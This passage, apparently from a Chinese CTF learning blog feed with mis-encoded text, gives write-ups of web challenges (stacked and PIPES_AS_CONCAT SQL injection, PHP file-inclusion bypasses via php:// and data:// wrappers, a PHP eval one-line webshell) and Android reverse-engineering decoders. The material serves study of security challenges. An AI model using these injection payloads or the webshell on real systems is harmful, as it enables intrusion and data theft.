</p><p>ç„¶åç»§ç»­å°è¯•æŠ¥é”™æ³¨å…¥æ”¶é›†ä¿¡æ¯ï¼Œæœ‰<strong>updatexml</strong>ä¸<strong>extractvalue</strong>ï¼Œç”±ä¸Šé¢çŸ¥é“ï¼Œè¿™é‡Œè¿‡æ»¤äº†updateï¼Œæ‰€ä»¥ä½¿ç”¨extractvalueï¼š</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413191438306.png" alt="image-20210413191438306"></p><p>è¿™æ—¶å€™å³æ—¶å¾—åˆ°äº†ä¸Šé¢çš„ä¿¡æ¯ï¼Œä½†åˆæ€ä¹ˆåˆ©ç”¨å‘¢ã€‚ã€‚</p><p>å †å æ³¨å…¥ï¼Œä¸€æ¬¡æ‰§è¡Œå¤šæ¡ç”± ; åˆ†éš”çš„æŒ‡ä»¤ã€‚</p><p>æŸ¥è¯¢å½“å‰æ­£åœ¨ä½¿ç”¨è¿‡çš„æ•°æ®åº“çš„è¡¨ï¼š<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413191836676.png" alt="image-20210413191836676"></p><p>2ä¸ªè¡¨ï¼Œç»§ç»­æŸ¥è¯¢ä¸€ä¸‹ä»–ä»¬çš„å­—æ®µï¼Œçœ‹åˆ°flagå­—æ®µï¼š<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413192003223.png" alt="image-20210413192003223"></p><p>é—®é¢˜åˆæ¥äº†ï¼Œä¸èƒ½ä½¿ç”¨selectè¯­å¥ï¼Œé‚£è¿™é‡Œå¦‚ä½•æŸ¥è¯¢å­—æ®µçš„å€¼å‘¢ã€‚ã€‚</p><p><strong>ç¬¬ä¸€ä¸ªæ–¹æ³•ï¼šä½¿ç”¨<a href="https://blog.csdn.net/JesseYoung/article/details/40785137?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">mysqlæŸ¥è¯¢è¯­å¥-handler</a></strong></p><p>é¦–å…ˆæ‰“å¼€ä¸€ä¸ªå¥æŸ„ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">open</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è¡¨æ•°æ®ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">read</span> <span class="keyword">next</span>;</span><br></pre></td></tr></table></figure><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413193146361.png" alt="image-20210413193146361"></p><p><strong>ç¬¬äºŒç§æ–¹æ³•ï¼šå› ä¸ºæ²¡æœ‰ç¦ç”¨renameä¸alertï¼Œæ‰€ä»¥å¯ä»¥ä¿®æ”¹è¡¨ç»“æ„ã€‚</strong></p><p>å› ä¸ºæœ‰ä¸€ä¸ªé»˜è®¤è¡¨wordsï¼Œæˆ‘ä»¬è¾“å…¥çš„injectå‚æ•°ä¹Ÿæ˜¯ä¼ å…¥å…¶ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å­˜æ”¾flagçš„è¡¨æ”¹ä¸ºwordsï¼Œå¹¶ä¿®æ”¹flagå­—æ®µä¸ºidå­—æ®µæˆ–è€…åŠ å…¥idå­—æ®µï¼Œæœ€åé€šè¿‡ä¸‡èƒ½å¯†ç æŸ¥è¯¢é»˜è®¤çš„è¡¨å°±å¾—åˆ°flagäº†ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words; <span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>);%23</span><br></pre></td></tr></table></figure><p><strong>æœ€åè¿™ä¸ªé¢˜ï¼Œå‡ºç°è¿™ä¸ªæ¼æ´çš„åŸå› æ˜¯ä½¿ç”¨äº†multi_query()æ‰§è¡Œä¸€æ¡æˆ–å¤šæ¡sqlè¯­å¥ã€‚</strong></p><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h3><p>ä»æ³¨é‡Šä¸­çš„æç¤ºå¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡getæ–¹å¼è·å–å‚æ•°catï¼Œå¹¶æ¯”è¾ƒäº†catå‚æ•°å€¼æ˜¯ä¸æ˜¯å­—ç¬¦ä¸²dogï¼š</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415130344338.png" alt="image-20210415130344338"></p><p>å¥½çªç„¶ï¼Œç›´æ¥ä¼ å…¥å¯¹åº”çš„å‚æ•°ï¼Œå¾—åˆ°flagã€‚ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415130430173.png" alt="image-20210415130430173"></p><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>çœ‹wpåå¤ç°çš„ï¼ˆã€‚ã€‚</p><p>å°±ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè¿˜æ˜¯å…ˆå°è¯•äº†ä¸€ä¸‹ä¹‹å‰çš„æ–¹æ³•ï¼Œè¾“å…¥1â€™æ˜¯å¦æŠ¥é”™ï¼ŒæŠ¥é”™ç±»å‹ï¼Œæˆ–è€…çœ‹è¾“å…¥1ä¸1+1çš„ç»“æœæ˜¯å¦ç›¸ç­‰ï¼Œä½†è¿™é‡Œéƒ½æ— æœã€‚ä½†æ˜¯å‘ç°å›æ˜¾åªæœ‰3ç§ï¼Œ1.ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼›2.Nonono.; 3.Array (    [0] =&gt; 1 )ã€‚</p><p>ä¸”å¯ä»¥å‘ç°ï¼Œå½“è¾“å…¥ä¸º0ï¼Œæ²¡æœ‰æ˜¾ç¤ºï¼Œçº¯å­—ç¬¦ä¸²ä¹Ÿæ²¡æœ‰æ˜¾ç¤ºï¼Œå­—ç¬¦ä¸²å¼€å¤´åŠ æ•°å­—ä¹Ÿæ˜¯æ²¡æœ‰æ˜¾ç¤ºï¼Œè¿™å…¶å®å°±å¯ä»¥æ€»ç»“ä¸ºè¾“å…¥0ï¼Œæ²¡æœ‰å›æ˜¾ï¼Œå› ä¸ºphpç§ï¼Œçº¯å­—ç¬¦ä¸²æˆ–è€…å­—ç¬¦ä¸²å¼€å¤´åŠ æ•°å­—éƒ½æ˜¯ä¼šè½¬åŒ–ä¸º0ã€‚</p><p>ç„¶åå½“è¾“å…¥æ•°å­—æ—¶ï¼Œå°±ä¼šæœ‰Array (    [0] =&gt; 1 )è¿™æ ·çš„å›æ˜¾ï¼Œä¸”éƒ½æ˜¯1ï¼Œæ˜¯dump_varæ˜¾ç¤ºçš„ã€‚ã€‚</p><p>ä»ä»¥ä¸Šå¯ä»¥çŒœæµ‹æŸ¥è¯¢è¯­å¥ä¸­æœ‰ || å·ï¼Œè¿™è¾“å‡ºç»“æœåªæœ‰0æˆ–1ã€‚</p><p>ä¸€ï¼Œå®˜æ–¹é¢˜è§£ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br><span class="line">æ„é€ æˆ<span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span> || flag <span class="keyword">FROM</span> Flagï¼Œå…¶ä¸­PIPES_AS_CONCATèƒ½å°† || è§†ä¸ºå­—ç¬¦ä¸²è¿æ¥ç¬¦è€Œéæˆ–è¿ç®—ç¬¦ã€‚è¿™ç§æ¨¡å¼ä¸‹ä½¿ç”¨å­—æ¯è¿æ¥ä¼šæŠ¥é”™ï¼Œä½¿ç”¨æ•°å­—è¿æ¥æ‰ä¼šæŸ¥è¯¢å‡ºæ•°æ®ï¼Œå› ä¸ºè¿™ä¸ª || ç›¸å½“äºæ˜¯å°† <span class="keyword">select</span> <span class="number">1</span> å’Œ <span class="keyword">select</span> flag <span class="keyword">from</span> flag çš„ç»“æœæ‹¼æ¥åœ¨ä¸€èµ·ã€‚</span><br></pre></td></tr></table></figure><p>äºŒï¼Œéé¢„æœŸè§£ï¼š</p><p>å› ä¸ºæ²¡æœ‰è¿‡æ»¤*ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p>å³æŸ¥è¯¢è¡¨ä¸­æ‰€æœ‰å­—æ®µåå†æŸ¥è¯¢ä¸€ä¸ª0æˆ–1ã€‚</p><p>è´´ä¸€ä¸‹ç”¨é¢„æœŸè§£æŸ¥è¯¢çš„ç»“æœï¼š</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415202556117.png" alt="image-20210415202556117"></p><h3 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h3><h2 id="æ”»é˜²ä¸–ç•Œ"><a href="#æ”»é˜²ä¸–ç•Œ" class="headerlink" title="æ”»é˜²ä¸–ç•Œ"></a>æ”»é˜²ä¸–ç•Œ</h2><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>ä»æç¤ºåˆå§‹é¡µé¢ï¼Œæƒ³åˆ°index.phpã€‚</p><p>è®¿é—®index.phpå‘ç°åˆè·³åˆ°1.phpé¡µé¢äº†ï¼Œä½†å¯ä»¥çœ‹åˆ°index.phpï¼Œä»å“åº”å¤´ä¸­çœ‹åˆ°flagï¼Œåªæ˜¯çŠ¶æ€ç ä¸º302ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210312231932538.png" alt="image-20210312231932538"></p><p>å¯¹äºçŠ¶æ€ç 302ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºè¯¥èµ„æºåŸæœ¬å­˜åœ¨ï¼Œä½†è¢«ä¸´æ—¶æ”¹å˜äº†ä½ç½®ã€‚ä¸€èˆ¬è¢«æ›¿æ¢äº†ä½ç½®åï¼Œæˆ‘ä»¬å†è®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨é‡å®šå‘åˆ°ä¸€ä¸ªè®¾ç½®å¥½çš„ç½‘é¡µï¼Œä¸”æ”¹è¢«è®¾ç½®å¥½çš„ç½‘é¡µåœ¨å“åº”å¤´çš„Locationåˆç»™å‡ºï¼Œå¦‚ä¸Šå›¾ã€‚</p><h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>è€ƒäº†ä¸€ä¸ªrobots.txtçš„åè®®ï¼Œé¦–å…ˆè¯»äº†ä¸€ä¸‹é¢˜ç›®æä¾›çš„å…³äºè¿™ä¸ªçš„è‹±æ–‡æ–‡æ¡£ï¼Œæ€»ç»“ä¸€ä¸‹æ˜¯ï¼šåœ¨éµå¾ªè¿™ä¸ªåè®®çš„æœç´¢å¼•æ“è®¿é—®ä¸€ä¸ªç½‘ç«™æ—¶ï¼Œé¦–å…ˆè¦åšçš„å°±æ˜¯è®¿é—®è¯¥ç½‘ç«™ä¸‹çš„robots.txtæ–‡ä»¶ï¼Œè‹¥æ²¡æœ‰çš„è¯åˆ™è¡¨ç¤ºå¯ä»¥è®¿é—®è¯¥ç½‘ç«™ä¸‹çš„æ‰€æœ‰å†…å®¹ï¼Œè‹¥å‘ç°çš„è¯ï¼Œå°±è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶éµå®ˆè¿™ä¸ªæ–‡ä»¶ä¸­çš„åè®®æŒ‡ä»¤åªè®¿é—®è¢«å…è®¸è®¿é—®çš„å†…å®¹ã€‚</p><p>ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p><blockquote><p>ç¦æ­¢æ‰€æœ‰æœç´¢å¼•æ“è®¿é—®æœ¬ç½‘ç«™çš„æ‰€æœ‰å†…å®¹ï¼š<br><strong>User-agent: *</strong></p><p><strong>Disallow: /</strong></p></blockquote><p>æ‰€ä»¥è¯´è¿™ä¸ªæ–‡ä»¶é™åˆ¶äº†ä¸è¢«å…è®¸è®¿é—®çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™å…¶å®ä¹Ÿå°±é—´æ¥æ³„éœ²äº†è¿™ä¸ªç½‘ç«™çš„æ–‡ä»¶ç›®å½•ç»“æ„ã€‚</p><p>è®¿é—®robots.txtå¾—åˆ°ï¼š<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313101940154.png" alt="image-20210313101940154"></p><p>è®¿é—®fl0g.phpå¾—åˆ°flagã€‚</p><h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>æˆ‘ä¸çŸ¥é“è¿™ä¸ªç‰ˆæœ¬çš„phpæœ‰è¿™ä¸ªæ¼æ´ï¼Œä¹Ÿæ²¡æœ‰æ„è¯†å»githubæœç›¸å…³ç‰ˆæœ¬çœ‹æ˜¯å¦æœ‰ç›¸å…³æ¼æ´ã€‚</p><p>è¿™é‡Œç›´æ¥çœ‹äº†wpï¼ŒçŸ¥é“æœ‰ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œç½‘ä¸Šåˆ©ç”¨æ–¹å¼ä¹Ÿæ˜¯å¾ˆå¤šï¼Œç›®å‰ä¹Ÿä¸ä¼šè‡ªå·±å†™åˆ©ç”¨ï¼Œ</p><p>ç›´æ¥ä½¿ç”¨ç°æˆçš„æ‰“äº†ä¸€ä¸‹ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313104841755.png" alt="image-20210313104841755"></p><h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>é¦–å…ˆè®°ä¸€ä¸‹2ä¸ªåŒ…å«çš„åŒºåˆ«ï¼š</p><ul><li>require ç”Ÿæˆä¸€ä¸ªè‡´å‘½é”™è¯¯ï¼ˆE_COMPILE_ERRORï¼‰ï¼Œåœ¨é”™è¯¯å‘ç”Ÿåè„šæœ¬ä¼šåœæ­¢æ‰§è¡Œã€‚</li><li>include ç”Ÿæˆä¸€ä¸ªè­¦å‘Šï¼ˆE_WARNINGï¼‰ï¼Œåœ¨é”™è¯¯å‘ç”Ÿåè„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚</li></ul><p>æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313152324318.png" alt="image-20210313152324318"></p><p>ä½¿ç”¨äº†strstrå‡½æ•°åŒ¹é…<strong>â€œphp://â€</strong>å­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤ã€‚</p><blockquote><p>php://input</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒç›´æ¥å†™å…¥phpæ–‡ä»¶ã€‚</p></blockquote><p>ç°åœ¨è¦åšçš„å°±æ˜¯ç»•è¿‡ä¸Šé¢çš„å­—ç¬¦ä¸²è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨strstrï¼ˆï¼‰å‡½æ•°åŒ¹é…å¤§å°å†™çš„ç‰¹æ€§ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313152604534.png" alt="image-20210313152604534"></p><p>çœ‹wpå­¦ä¹ ã€‚</p><p>è¿™ä¸ªé¢˜è¿˜å¯ä»¥ä½¿ç”¨data://ä¼ªåè®®ã€‚</p><p>ä½¿ç”¨æ–¹æ³•ï¼š<strong>data://text/plain;base64,base64ç¼–ç åçš„æ•°æ®</strong>ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼‰<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313153729207.png" alt="image-20210313153729207"></p><p>å¦å¤–è¿˜æœ‰å¯ä»¥ä¼ å…¥ä¸€å¥è¯æœ¨é©¬ã€‚<strong>è¿™é‡Œæˆ‘è¯•äº†ä¸‹ï¼Œä¸ºä»€ä¹ˆï¼›åä¸€å®šè¦ç©ºæ ¼æ‰å¯¹ã€‚</strong></p><p><strong><?php eval($_POST[root]); ?></strong></p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313155834858.png" alt="image-20210313155834858"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»å„å¤„webé¢˜å­¦ä¹ ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://www.Bxnop.cn/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>Andriodä¹‹CTFå­¦ä¹ </title>
    <link href="https://www.bxnop.cn/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.bxnop.cn/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-02-05T07:09:15.000Z</published>
    <updated>2021-05-05T02:57:58.281Z</updated>
    
    <content type="html"><![CDATA[<p>ä»å„å¤„Androidé¢˜æ¥å­¦ä¹ ã€‚</p><a id="more"></a><h2 id="æ”»é˜²ä¸–ç•Œ"><a href="#æ”»é˜²ä¸–ç•Œ" class="headerlink" title="æ”»é˜²ä¸–ç•Œ"></a>æ”»é˜²ä¸–ç•Œ</h2><h3 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h3><p>æ¥åˆ°å…³é”®äº‹ä»¶ï¼Œå–å‡ºè¾“å…¥åä¼ å…¥aæ–¹æ³•ï¼Œåœ¨aæ–¹æ³•åˆæŠŠè¾“å…¥ä¼ å…¥äº†å®ä¾‹åŒ–çš„ä¸€ä¸ªaç±»å¯¹è±¡ä¸­çš„aæ–¹æ³•ã€‚å…¨æ˜¯aã€‚ã€‚æœ€åè°ƒç”¨nativeå±‚çš„ncheckå‡½æ•°ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205171126725.png" alt="image-20210205171126725"></p><p>aç±»ä¸­çš„aæ–¹æ³•ä¸€ä¸ªæ¢è¡¨çš„base64ï¼Œnativeå±‚ncheckå‡½æ•°è¿›è¡Œç®€å•åŠ å¯†åä¸å¯†æ–‡å¯¹æ¯”ã€‚</p><p>nativeå±‚æœ‰JNIEnvæ–¹æ³•ï¼Œidaä¸ä¼šè‡ªåŠ¨è¯†åˆ«ï¼Œå°†æŒ‡å®šå˜é‡æ”¹ä¸€ä¸‹ç±»å‹å°±è¡Œäº†ã€‚<strong>JNIEnv*</strong></p><p>ç”¨ä¸€ä¸‹ida-pythonã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">base = [<span class="string">'i'</span>, <span class="string">'5'</span>, <span class="string">'j'</span>, <span class="string">'L'</span>, <span class="string">'W'</span>, <span class="string">'7'</span>, <span class="string">'S'</span>, <span class="string">'0'</span>, <span class="string">'G'</span>, <span class="string">'X'</span>, <span class="string">'6'</span>, <span class="string">'u'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'c'</span>, <span class="string">'v'</span>, <span class="string">'3'</span>, <span class="string">'n'</span>, <span class="string">'y'</span>, <span class="string">'4'</span>, <span class="string">'q'</span>, <span class="string">'8'</span>, <span class="string">'e'</span>, <span class="string">'s'</span>, <span class="string">'2'</span>, <span class="string">'Q'</span>, <span class="string">'+'</span>, <span class="string">'b'</span>, <span class="string">'d'</span>, <span class="string">'k'</span>, <span class="string">'Y'</span>, <span class="string">'g'</span>, <span class="string">'K'</span>, <span class="string">'O'</span>, <span class="string">'I'</span>, <span class="string">'T'</span>, <span class="string">'/'</span>, <span class="string">'t'</span>, <span class="string">'A'</span>, <span class="string">'x'</span>, <span class="string">'U'</span>, <span class="string">'r'</span>, <span class="string">'F'</span>, <span class="string">'l'</span>, <span class="string">'V'</span>, <span class="string">'P'</span>, <span class="string">'z'</span>, <span class="string">'h'</span>, <span class="string">'m'</span>, <span class="string">'o'</span>, <span class="string">'w'</span>, <span class="string">'9'</span>, <span class="string">'B'</span>, <span class="string">'H'</span>, <span class="string">'C'</span>, <span class="string">'M'</span>, <span class="string">'D'</span>, <span class="string">'p'</span>, <span class="string">'E'</span>, <span class="string">'a'</span>, <span class="string">'J'</span>, <span class="string">'R'</span>, <span class="string">'Z'</span>, <span class="string">'N'</span>]</span><br><span class="line">base1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">s = <span class="string">'MbT3sQgX039i3g==AQOoMQFPskB1Bsc7'</span></span><br><span class="line">s = list(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">2</span>):</span><br><span class="line">    s[<span class="number">2</span>*i], s[<span class="number">2</span>*i+<span class="number">1</span>] = s[<span class="number">2</span>*i+<span class="number">1</span>], s[<span class="number">2</span>*i]</span><br><span class="line">s = s[<span class="number">16</span>:<span class="number">32</span>]+s[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">'='</span>:</span><br><span class="line">        ans += [base.index(i)]</span><br><span class="line">flag = [base1[i] <span class="keyword">for</span> i <span class="keyword">in</span> ans]</span><br><span class="line">flag = base64.b64decode(<span class="string">''</span>.join(flag)+<span class="string">'=='</span>)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;just_ANot#er_@p3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h3><p>è¿™ä¸ªé¢˜æ¶‰åŠçš„çŸ¥è¯†æŒºå¤šï¼Œå¯¹åˆå­¦å®‰å“æŒºä¸é”™çš„ã€‚</p><p>ä»010editorå‘ç°äº†ANDROID BACKUPï¼Œå®‰å“å¤‡ä»½æ–‡ä»¶ã€‚å¼€å§‹å‡ºç°æ–°çš„çŸ¥è¯†äº†ï¼Œæ‰¾äº†ä¸€ç¯‡æ–‡ç« è®²è¿™ä¸ªçš„å­¦ä¹ äº†ä¸€ä¸‹ï¼Œè®²çš„çœŸå¥½ã€‚<a href="https://blog.csdn.net/qq_31387043/article/details/51452782" target="_blank" rel="noopener">Androidä¸­allowBackup</a>ï¼ŒçŸ¥é“äº†è¿™ä¸ªå¯ä»¥ç”¨android-backup-extractor(abe)å·¥å…·æ¥è§£æabæ–‡ä»¶ã€‚</p><p>å¯¹äºabæ–‡ä»¶ï¼Œå‰24å­—èŠ‚ç±»ä¼¼æ–‡ä»¶å¤´çš„ä¸œè¥¿ï¼Œè‹¥æ–‡ä»¶æ˜¯åŠ å¯†çš„è¯ï¼Œå¯ä»¥åœ¨å‰24å­—èŠ‚ä¸­çœ‹è§AES-256æ ‡å¿—ï¼Œå¦åˆ™å‡ºç°noneå­—ç¬¦ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205222314992.png" alt="image-20210205222314992"></p><p>ä½¿ç”¨<code>java -jar abe.jar unpack 1.ab 1.tar</code>è§£ææ–‡ä»¶ï¼Œè¿™æ ·å¾—åˆ°ä¸€ä¸ªtarå‹ç¼©åŒ…ã€‚è§£å‹åå‘ç°æœ‰ä¸€ä¸ªapkæ–‡ä»¶å’Œä¸€äº›æ•°æ®åº“æ–‡ä»¶ã€‚</p><p>ä¸Šå­¦æœŸå­¦ä¹ äº†javaå’Œmysqlè¿™2é—¨è¯¾ç¨‹ï¼ŒçœŸæ˜¯å¥½ã€‚hhaã€‚ã€‚</p><p>çœ‹äº†çœ‹åç¼–è¯‘apkä¸­çš„ä»£ç ï¼Œå‘ç°åˆ›å»ºè¡¨æ“ä½œå’Œå…¶ä¸­åŒ…å«çš„flagæ–‡ä»¶ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205222830438.png" alt="image-20210205222830438"></p><p>å†åŠ ä¸Šå¤–é¢çš„æ•°æ®åº“æ–‡ä»¶ï¼Œå¯ä»¥çŒœæµ‹æˆ‘ä»¬çš„flagå°±é‚£äº›æ•°æ®åº“ä¸­ã€‚</p><p>æŸ¥è¯¢ç›¸å…³èµ„æ–™ï¼ŒçŸ¥é“äº†è¿™ä¸ªè¦ç”¨DB Browser for SQLiteä¸­çš„SQLCiperçš„æ‰“å¼€ï¼Œä¸‹è½½åå‡†å¤‡æ‰“å¼€æ•°æ®åº“æ–‡ä»¶å‘ç°è¦å¯†ç ã€‚è¿™ä¹Ÿå’ŒçŒœæƒ³çš„ä¸€æ ·ï¼Œé¢˜ç›®å°±æ˜¯è¦è®©æˆ‘ä»¬æ‰¾è¿™ä¸ªå¯†ç ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205223604786.png" alt="image-20210205223604786"></p><p>å¯¹äºkeyï¼Œé€šè¿‡ä¼ å…¥Strangerå’Œ123456ç»è¿‡aåŒ…ä¸­çš„aï¼Œbç±»ä¸­çš„æ–¹æ³•åŠ å¯†ã€‚aç±»ä¸­çš„æ–¹æ³•å°±æ˜¯å­—ç¬¦ä¸²æˆªå–æ“ä½œï¼Œbç±»ä¸­çš„æ–¹æ³•ä¸€ä¸ªMD5ä¸€ä¸ªSHA-1ã€‚ç¨‹åºæ˜¯å¯ä»¥è°ƒè¯•çš„ï¼Œæ‰€ä»¥ç›´æ¥è°ƒè¯•å¾—åˆ°keyã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205223928065.png" alt="image-20210205223928065"></p><p>æ‰“å¼€æ•°æ®åº“å¾—åˆ°ä¸€ä¸²base64å­—ç¬¦ä¸²ï¼Œè§£å¯†å¾—åˆ°flagã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205224023165.png" alt="image-20210205224023165"></p><h3 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy-apk"></a>easy-apk</h3><p>æ‰¾åˆ°ä¸»æ´»åŠ¨ï¼Œå°±ä¸€ä¸ªå˜è¡¨çš„base64ç¼–ç ï¼Œpythonç®€å•å†™ä¸€ä¸‹å°±å¥½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">base = [<span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span 